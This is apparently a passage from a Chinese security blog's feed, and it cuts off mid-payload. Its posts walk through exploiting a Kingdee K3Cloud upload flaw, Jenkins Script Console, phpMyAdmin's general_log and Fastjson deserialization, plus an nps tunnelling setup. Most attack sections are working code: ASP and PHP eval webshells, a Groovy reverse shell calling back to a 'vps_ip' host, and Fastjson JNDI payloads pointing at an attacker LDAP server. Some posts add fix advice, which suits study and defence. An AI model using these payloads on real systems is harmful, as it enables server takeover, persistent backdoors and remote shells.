class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://xxx/k3cloud/uploadfiles/test.ashx<br></code></pre></td></tr></table></figure><p>执行后，在同目录下会生成一句话木马：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://xxx/k3cloud/uploadfiles/root.asp<br></code></pre></td></tr></table></figure><p>一句话木马内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asp">&lt;%eval request(&quot;ant&quot;)%&gt;<br></code></pre></td></tr></table></figure><hr><h3 id="✅-3️⃣-使用-webshell-客户端连接"><a href="#✅-3️⃣-使用-webshell-客户端连接" class="headerlink" title="✅ 3️⃣ 使用 webshell 客户端连接"></a>✅ 3️⃣ 使用 webshell 客户端连接</h3><p>连接：</p><ul><li>Webshell 地址：<code>http://xxx/k3cloud/uploadfiles/root.asp</code></li><li>连接密码：<code>ant</code></li></ul><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-20250714121437326.png" alt="image-20250714121437326"></p><p>可执行系统命令、上传其他后门文件或横向渗透。</p><hr><h2 id="🔍-漏洞危害"><a href="#🔍-漏洞危害" class="headerlink" title="🔍 漏洞危害"></a>🔍 漏洞危害</h2><p>✅ <strong>影响点：</strong></p><ul><li>攻击者可在服务器任意目录写入可执行脚本。</li><li>远程命令执行，可获取服务器权限。</li><li>可持久化后门、横向移动至数据库、ERP 核心业务数据。</li></ul><hr><h2 id="🛡️-修复与防护"><a href="#🛡️-修复与防护" class="headerlink" title="🛡️ 修复与防护"></a>🛡️ 修复与防护</h2><p>✅ <strong>官方建议：</strong></p><ul><li>升级至最新版，修复上传路径校验漏洞。</li><li>限制上传文件类型和存储路径，禁止执行型后缀。</li><li>增加 WAF 上传防护，拦截可疑文件内容。</li><li>服务器开启只读目录隔离，禁止上传目录可执行。</li><li>定期审计 <code>uploadfiles</code> 等公共目录。</li></ul><hr><p>🚨 <strong>总结</strong>：此类任意文件上传是企业 ERP 和 OA 系统的高危漏洞之一，核心点在于：</p><ul><li>路径穿越</li><li>可执行文件上传</li><li>弱后端验证</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>漏洞复现 - Jenkins Script Console 未授权远程命令执行</title>
    <link href="/2025/03/20/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20-%20Jenkins%20Script%20Console%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <url>/2025/03/20/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20-%20Jenkins%20Script%20Console%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<h2 id="🎯-漏洞简介"><a href="#🎯-漏洞简介" class="headerlink" title="🎯 漏洞简介"></a>🎯 漏洞简介</h2><p>Jenkins 是一款流行的开源 CI&#x2F;CD 自动化部署工具，默认开启了 Script Console（脚本控制台），用于管理员执行 Groovy 脚本对 Jenkins 实例进行动态管理。</p><p><strong>核心风险：</strong></p><ul><li>Script Console 拥有与 Jenkins Master 相同的系统权限。</li><li>若攻击者可访问该接口且具备权限（或存在身份验证绕过），即可执行任意系统命令。</li><li>可直接执行命令、下载文件或反弹 shell，危害极大。</li></ul><hr><h2 id="🗂️-漏洞环境"><a href="#🗂️-漏洞环境" class="headerlink" title="🗂️ 漏洞环境"></a>🗂️ 漏洞环境</h2><p>访问 Jenkins Script Console 页面：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://&lt;目标&gt;/script<br></code></pre></td></tr></table></figure><p>如果未做权限限制或存在已知绕过（如弱口令&#x2F;未授权&#x2F;令牌泄露），可直接执行 Groovy 脚本。</p><hr><h2 id="🚩-漏洞复现"><a href="#🚩-漏洞复现" class="headerlink" title="🚩 漏洞复现"></a>🚩 漏洞复现</h2><h3 id="✅-1️⃣-执行系统命令"><a href="#✅-1️⃣-执行系统命令" class="headerlink" title="✅ 1️⃣ 执行系统命令"></a>✅ 1️⃣ 执行系统命令</h3><p>在脚本控制台输入：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs groovy">println <span class="hljs-string">&quot;whoami&quot;</span>.execute().text<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-20250714124035244.png" alt="image-20250714124035244"></p><p>执行后即可获得 Jenkins 宿主机的当前用户。</p><hr><h3 id="✅-2️⃣-反弹-Shell"><a href="#✅-2️⃣-反弹-Shell" class="headerlink" title="✅ 2️⃣ 反弹 Shell"></a>✅ 2️⃣ 反弹 Shell</h3><p>如果需要获取交互式 shell，可在脚本控制台执行以下 Groovy 反弹 shell：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs groovy">String host=<span class="hljs-string">&quot;vps_ip&quot;</span>;<br><span class="hljs-type">int</span> port=<span class="hljs-number">18888</span>;<br>String cmd=<span class="hljs-string">&quot;/bin/bash&quot;</span>;<br>Process p=<span class="hljs-keyword">new</span> ProcessBuilder(cmd).redirectErrorStream(<span class="hljs-literal">true</span>).start();<br>Socket s=<span class="hljs-keyword">new</span> Socket(host,port);<br>InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();<br>OutputStream po=p.getOutputStream(),so=s.getOutputStream();<br><span class="hljs-keyword">while</span>(!s.isClosed())&#123;<br>  <span class="hljs-keyword">while</span>(pi.available()&gt;<span class="hljs-number">0</span>)so.write(pi.read());<br>  <span class="hljs-keyword">while</span>(pe.available()&gt;<span class="hljs-number">0</span>)so.write(pe.read());<br>  <span class="hljs-keyword">while</span>(si.available()&gt;<span class="hljs-number">0</span>)po.write(si.read());<br>  so.flush();po.flush();<br>  Thread.sleep(<span class="hljs-number">50</span>);<br>  <span class="hljs-keyword">try</span> &#123; p.exitValue(); <span class="hljs-keyword">break</span>; &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;&#125;<br>&#125;;<br>p.destroy();s.close();<br></code></pre></td></tr></table></figure><p>监听端执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvvp 18888<br></code></pre></td></tr></table></figure><p>执行后即可获取目标宿主机的交互式 shell。</p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-20250714124107634.png" alt="image-20250714124107634"></p><hr><h2 id="🔍-风险点与危害"><a href="#🔍-风险点与危害" class="headerlink" title="🔍 风险点与危害"></a>🔍 风险点与危害</h2><ul><li><p>Jenkins Script Console 权限与 Jenkins Master 一致，等同于宿主机 root（或运行用户）权限。</p></li><li><p>一旦泄露凭证或未授权暴露，后果等同于服务器沦陷。</p></li><li><p>可被用于：</p><ul><li>横向移动（读取密钥）</li><li>内网代理</li><li>持久化后门</li></ul></li></ul><hr><h2 id="🛡️-修复与防护"><a href="#🛡️-修复与防护" class="headerlink" title="🛡️ 修复与防护"></a>🛡️ 修复与防护</h2><p>✅ <strong>官方建议：</strong></p><ul><li>禁止未授权用户访问 Script Console，仅保留给可信管理员。</li><li>使用强口令和多因素认证（MFA）。</li><li>将 Jenkins Master 部署在受限内网环境，不暴露公网。</li><li>最小化插件安装，及时更新至最新版本。</li><li>使用代理防火墙限制 <code>/script</code> 路径访问。</li></ul><hr><h2 id="⚠️-参考"><a href="#⚠️-参考" class="headerlink" title="⚠️ 参考"></a>⚠️ 参考</h2><ul><li><a href="https://www.jenkins.io/doc/book/managing/script-console/">Jenkins 官方 Script Console</a></li><li><a href="https://www.exploit-db.com/exploits/43913">Groovy RCE 资料</a></li></ul><hr><p>🚨 <strong>总结</strong>：Jenkins Script Console 是典型的高危运维接口，若暴露且权限未控，等同于宿主机后门！务必内网访问、严格授权、定期审计！</p>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>Jenkins</tag>
      
      <tag>RCE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用 nps 搭建内网穿透代理服务器</title>
    <link href="/2024/08/23/%E4%BD%BF%E7%94%A8%20nps%20%E6%90%AD%E5%BB%BA%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <url>/2024/08/23/%E4%BD%BF%E7%94%A8%20nps%20%E6%90%AD%E5%BB%BA%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="🚀-简介"><a href="#🚀-简介" class="headerlink" title="🚀 简介"></a>🚀 简介</h2><p>一款轻量级、高性能、功能强大的内网穿透代理服务器。支持tcp、udp、socks5、http等几乎所有流量转发，可用来访问内网网站、本地支付接口调试、ssh访问、远程桌面，内网dns解析、内网socks5代理等等……，并带有功能强大的web管理端。</p><h2 id="📌-VPS-端配置"><a href="#📌-VPS-端配置" class="headerlink" title="📌 VPS 端配置"></a>📌 VPS 端配置</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 拉取 nps Docker 镜像</span><br>docker pull ffdfgdfg/nps<br><br><span class="hljs-comment"># 启动 nps 服务</span><br>docker run -d \<br>  -p 12100-12200:12100-12200 \<br>  -v /root/nps/conf:/conf \<br>  --name=nps_server \<br>  ffdfgdfg/nps<br><br><span class="hljs-comment"># 管理后台访问（默认账号：admin / admin）</span><br><span class="hljs-comment"># http://&lt;vps_ip&gt;:12100/login/index</span><br></code></pre></td></tr></table></figure><hr><h3 id="🎯-nps-conf-配置示例"><a href="#🎯-nps-conf-配置示例" class="headerlink" title="🎯 nps.conf 配置示例"></a>🎯 <code>nps.conf</code> 配置示例</h3><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">appname</span> = nps<br><span class="hljs-comment"># Boot mode: dev | pro</span><br><span class="hljs-attr">runmode</span> = dev<br><br><span class="hljs-comment"># HTTP/HTTPS 代理端口</span><br><span class="hljs-attr">http_proxy_ip</span> = <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span><br><span class="hljs-attr">http_proxy_port</span> = <span class="hljs-number">12101</span><br><span class="hljs-attr">https_proxy_port</span> = <span class="hljs-number">12102</span><br><span class="hljs-attr">https_just_proxy</span> = <span class="hljs-literal">true</span><br><br><span class="hljs-comment"># HTTPS 证书（可选）</span><br><span class="hljs-attr">https_default_cert_file</span> = conf/server.pem<br><span class="hljs-attr">https_default_key_file</span> = conf/server.key<br><br><span class="hljs-comment">## Bridge 通道</span><br><span class="hljs-attr">bridge_type</span> = tcp<br><span class="hljs-attr">bridge_port</span> = <span class="hljs-number">12103</span><br><span class="hljs-attr">bridge_ip</span> = <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span><br><br><span class="hljs-comment"># 公钥，客户端需要使用该 key 连接</span><br><span class="hljs-attr">public_vkey</span> = <span class="hljs-number">123</span><br><br><span class="hljs-comment"># 日志等级 0-7</span><br><span class="hljs-attr">log_level</span> = <span class="hljs-number">0</span><br><br><span class="hljs-comment"># P2P 相关配置</span><br><span class="hljs-attr">p2p_ip</span> = &lt;你的 VPS IP&gt;<br><span class="hljs-attr">p2p_port</span> = <span class="hljs-number">12200</span><br><br><span class="hljs-comment"># Web 管理界面</span><br><span class="hljs-attr">web_host</span> = a.o.com<br><span class="hljs-attr">web_username</span> = admin<br><span class="hljs-attr">web_password</span> = admin<br><span class="hljs-attr">web_port</span> = <span class="hljs-number">12100</span><br><span class="hljs-attr">web_ip</span> = <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span><br><span class="hljs-attr">web_open_ssl</span> = <span class="hljs-literal">false</span><br><br><span class="hljs-comment"># API 加密</span><br><span class="hljs-attr">auth_crypt_key</span> = test<br><br><span class="hljs-comment"># 其他选项</span><br><span class="hljs-attr">allow_user_login</span> = <span class="hljs-literal">false</span><br><span class="hljs-attr">allow_user_register</span> = <span class="hljs-literal">false</span><br><span class="hljs-attr">allow_user_change_username</span> = <span class="hljs-literal">false</span><br><span class="hljs-attr">system_info_display</span> = <span class="hljs-literal">false</span><br><br><span class="hljs-comment"># 客户端断开超时时间（单位：秒）</span><br><span class="hljs-attr">disconnect_timeout</span> = <span class="hljs-number">60</span><br></code></pre></td></tr></table></figure><p>示例图：</p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-20240823174934949.png" alt="nps 后台示例"></p><hr><h2 id="📌-客户端常用命令"><a href="#📌-客户端常用命令" class="headerlink" title="📌 客户端常用命令"></a>📌 客户端常用命令</h2><p>1️⃣ 在客户端机器，先用 Python 启一个临时 HTTP 服务（用于传文件）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -m http.server 12020<br></code></pre></td></tr></table></figure><p>2️⃣ 一键下载、解压、删除压缩包并后台运行客户端：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget http://&lt;vps_ip&gt;:12020/linux_amd64_client.tar.gz \<br>  &amp;&amp; tar -zxvf linux_amd64_client.tar.gz \<br>  &amp;&amp; <span class="hljs-built_in">rm</span> -rf linux_amd64_client.tar.gz \<br>  &amp;&amp; <span class="hljs-built_in">nohup</span> ./npc -server=&lt;vps_ip&gt;:12103 -vkey=&lt;你的_vkey&gt; &gt;/dev/null 2&gt;&amp;1 &amp;<br></code></pre></td></tr></table></figure><p>3️⃣ 客户端注册为服务（可选，不推荐）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 注册</span><br>./npc install -server=&lt;vps_ip&gt;:12103 -vkey=&lt;你的_vkey&gt;<br><br><span class="hljs-comment"># 启动</span><br>./npc start<br><br><span class="hljs-comment"># 停止</span><br>./npc stop<br><br><span class="hljs-comment"># 卸载</span><br>./npc uninstall<br></code></pre></td></tr></table></figure><p>示例图：</p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-20240823175045605.png" alt="nps 客户端示例"></p><hr><h2 id="⚡-小提示"><a href="#⚡-小提示" class="headerlink" title="⚡ 小提示"></a>⚡ 小提示</h2><ul><li><strong>安全组要先放通对应端口</strong>，否则客户端连不上服务端。</li><li>如果是 HTTP&#x2F;HTTPS 代理，记得域名解析要生效。</li><li><code>vkey</code> 尽量使用随机字符串，避免被猜测。</li><li>不熟悉 Docker 也可直接使用二进制运行，效果一样。</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>隧道代理</tag>
      
      <tag>内网穿透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>利用 phpMyAdmin 日志报错 getshell.md</title>
    <link href="/2024/08/23/%E5%88%A9%E7%94%A8%20phpMyAdmin%20%E6%97%A5%E5%BF%97%E6%8A%A5%E9%94%99%20getshell/"/>
    <url>/2024/08/23/%E5%88%A9%E7%94%A8%20phpMyAdmin%20%E6%97%A5%E5%BF%97%E6%8A%A5%E9%94%99%20getshell/</url>
    
    <content type="html"><![CDATA[<h4 id="🚀-简介"><a href="#🚀-简介" class="headerlink" title="🚀 简介"></a>🚀 简介</h4><p>利用 phpMyAdmin 的错误日志功能，可以巧妙地写入一句话木马，实现远程获取 WebShell。</p><hr><h4 id="🔥-利用步骤"><a href="#🔥-利用步骤" class="headerlink" title="🔥 利用步骤"></a>🔥 利用步骤</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 查看当前日志记录状态</span><br><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> &quot;general_log%&quot;;<br><br><span class="hljs-comment">-- 开启通用查询日志</span><br><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log<span class="hljs-operator">=</span><span class="hljs-string">&#x27;on&#x27;</span>;<br><br><span class="hljs-comment">-- 设置日志文件保存路径为网站根目录下的一个 PHP 文件（注意路径根据实际环境调整）</span><br><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log_file <span class="hljs-operator">=</span>&quot;D:\\phpStudy\\PHPTutorial\\WWW\\ant.php&quot;;<br><br><span class="hljs-comment">-- 通过执行SQL写入一句话木马（替换为你想要的 WebShell 代码）</span><br><span class="hljs-keyword">select</span> &quot;&lt;?php @eval(\$_POST[&#x27;cmd&#x27;]); ?&gt;&quot;;<br><br><span class="hljs-comment">-- 访问：http://你的服务器地址/ant.php 即可执行 WebShell</span><br></code></pre></td></tr></table></figure><hr><h4 id="⚠️-注意事项"><a href="#⚠️-注意事项" class="headerlink" title="⚠️ 注意事项"></a>⚠️ 注意事项</h4><ul><li>路径设置必须是 Web 服务器可访问的目录，否则无法访问到生成的木马文件。</li><li>该操作需要数据库有足够权限修改日志配置。</li><li>使用后请及时关闭日志功能，避免服务器性能下降或信息泄露。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log<span class="hljs-operator">=</span><span class="hljs-string">&#x27;off&#x27;</span>;<br></code></pre></td></tr></table></figure><hr><h4 id="📷-演示截图"><a href="#📷-演示截图" class="headerlink" title="📷 演示截图"></a>📷 演示截图</h4><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/%E5%9B%BE%E7%89%87-1-1024x509.png" alt="查看日志配置"></p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/%E5%9B%BE%E7%89%87-3-1024x236.png" alt="开启日志写入木马"></p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/%E5%9B%BE%E7%89%87-2-1024x520.png" alt="执行注入"></p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/%E5%9B%BE%E7%89%87-4-1024x641.png" alt="访问Shell"></p><hr>]]></content>
    
    
    
    <tags>
      
      <tag>phpMyAdmin</tag>
      
      <tag>getshell</tag>
      
      <tag>web安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>漏洞复现 - Fastjson反序列化漏洞</title>
    <link href="/2024/08/23/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20-%20Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <url>/2024/08/23/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20-%20Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Vulhub是一个基于<code>docker</code>和<code>docker-compose</code>的漏洞环境集合，进入对应目录并执行一条语句即可启动一个全新的漏洞环境，让漏洞复现变得更加简单，让安全研究者更加专注于漏洞原理本身。</p><p>Github地址：<a href="https://github.com/vulhub/vulhub">https://github.com/vulhub/vulhub</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 下载项目</span><br>git <span class="hljs-built_in">clone</span> https://github.com/vulhub/vulhub.git  <br><span class="hljs-comment"># 进入靶场目录</span><br><span class="hljs-built_in">cd</span> vulhub/xxx<br><span class="hljs-comment"># 启动靶场</span><br>docker-compose up<br></code></pre></td></tr></table></figure><h3 id="fastjson-≤-1-2-24-反序列化漏洞"><a href="#fastjson-≤-1-2-24-反序列化漏洞" class="headerlink" title="fastjson ≤ 1.2.24 反序列化漏洞"></a>fastjson ≤ 1.2.24 反序列化漏洞</h3><h4 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h4><p>靶场ip：192.168.199.132</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">cd /vulhub/fastjson/<span class="hljs-number">1.2</span><span class="hljs-number">.24</span>-rce<br>docker-compose up<br></code></pre></td></tr></table></figure><p>访问地址： <a href="http://192.168.199.132:8090/"><strong>http://192.168.199.132:8090/</strong></a>，即可看到 JSON 格式的输出。</p><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>使用Jndi漏洞利用工具，在公网服务器开启ldap服务，监听11389端口</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 开启ldap服务</span><br>java -jar JNDIExploit-<span class="hljs-number">1.2</span>-SNAPSHOT.jar -i vps_ip -l <span class="hljs-number">11389</span> -p <span class="hljs-number">18080</span><br></code></pre></td></tr></table></figure><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"># 命令执行回显,在请求头中添加cmd字段和要执行的命令<br>cmd:whoami<br><br>&#123;<br>  &quot;b&quot;:&#123;<br>    &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,<br>    &quot;dataSourceName&quot;:&quot;ldap://vps_ip:11389/Basic/TomcatEcho&quot;,<br>    &quot;autoCommit&quot;:true<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 反弹shell</span><br>nc -lvp <span class="hljs-number">18888</span><br><br>&#123;<br>  <span class="hljs-string">&quot;b&quot;</span>:&#123;<br>    <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<br>    <span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://vps_ip:11389/Basic/ReverseShell/vps_ip/18888&quot;</span>,<br>    <span class="hljs-string">&quot;autoCommit&quot;</span>:true<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="fastjson-≤-1-2-47-反序列化漏洞"><a href="#fastjson-≤-1-2-47-反序列化漏洞" class="headerlink" title="fastjson ≤ 1.2.47 反序列化漏洞"></a>fastjson ≤ 1.2.47 反序列化漏洞</h3><h4 id="漏洞环境-1"><a href="#漏洞环境-1" class="headerlink" title="漏洞环境"></a>漏洞环境</h4><p>靶场ip：192.168.199.132</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">cd /vulhub/fastjson/<span class="hljs-number">1.2</span><span class="hljs-number">.47</span>-rce<br>docker-compose up<br></code></pre></td></tr></table></figure><p>访问地址：<a href="http://192.168.199.132:8090/"><strong>http://192.168.199.132:8090/</strong></a>，即可看到 JSON 格式的输出。</p><h4 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>使用Jndi漏洞利用工具，在公网服务器开启ldap服务，监听11389端口</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 开启ldap服务</span><br>java -jar JNDIExploit-<span class="hljs-number">1.2</span>-SNAPSHOT.jar -i vps_ip -l <span class="hljs-number">11389</span> -p <span class="hljs-number">18080</span><br></code></pre></td></tr></table></figure><h4 id="命令执行-1"><a href="#命令执行-1" class="headerlink" title="命令执行"></a>命令执行</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 命令执行回显,在请求头中添加cmd字段和要执行的命令</span><br>cmd:whoami<br><br>&#123;<br>  <span class="hljs-string">&quot;a&quot;</span>:&#123;<br>    <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<br>    <span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br>  &#125;,<br>  <span class="hljs-string">&quot;b&quot;</span>:&#123;<br>    <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<br>    <span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://vps_ip:11389/Basic/TomcatEcho&quot;</span>,<br>    <span class="hljs-string">&quot;autoCommit&quot;</span>:true<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="反弹shell-1"><a href="#反弹shell-1" class="headerlink" title="反弹shell"></a>反弹shell</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 反弹shell</span><br>nc -lvp <span class="hljs-number">18888</span><br><br>&#123;<br>  <span class="hljs-string">&quot;a&quot;</span>:&#123;<br>    <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<br>    <span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br>  &#125;,<br>  <span class="hljs-string">&quot;b&quot;</span>:&#123;<br>    <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<br>    <span class="hljs-string">&quot;dataSourceName&quot;</span>:<span 